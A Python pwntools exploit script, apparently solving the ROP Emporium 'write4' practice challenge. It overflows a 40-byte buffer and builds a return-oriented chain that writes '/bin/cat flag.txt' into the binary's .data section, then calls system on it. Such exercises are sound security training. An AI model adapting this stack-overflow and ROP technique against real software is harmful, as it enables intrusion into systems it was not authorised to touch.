from pwn import *

e = ELF("write4")
p = process(e.path)
# p = gdb.debug(e.path)

# bof@40
# 0x0000000000400890: pop r14; pop r15; ret;
# 0x0000000000400820: mov qword ptr [r14], r15; ret; 
# .data 0x00601050


def write_string_at_address( mov_addr, pop_addr, string_dest, string):
	payload = ""
	string += "\x00"

	while not (len(string) % 8 == 0):
		string += "\x00"

	string_split = [string[i:i+8] for i in range(0, len(string), 8)]
	for i in range(len(string_split)):
		payload += p64(pop_addr)
		payload += p64(string_dest + (i*8))
		payload += string_split[i]
		payload += p64(mov_addr)


	return payload


junk = 'A' * 40
system = p64(e.sym.system)
poprdi = p64(0x400893)
scratch = p64(0x601050)

# chain = junk + poprdi + scratch + fgets + poprdi + scratch + system
chain = junk
chain += write_string_at_address(0x400820, 0x400890, 0x601050, "/bin/cat flag.txt")
chain += poprdi
chain += p64(0x601050)
chain += system

p.sendline(chain)
print(p.readall())
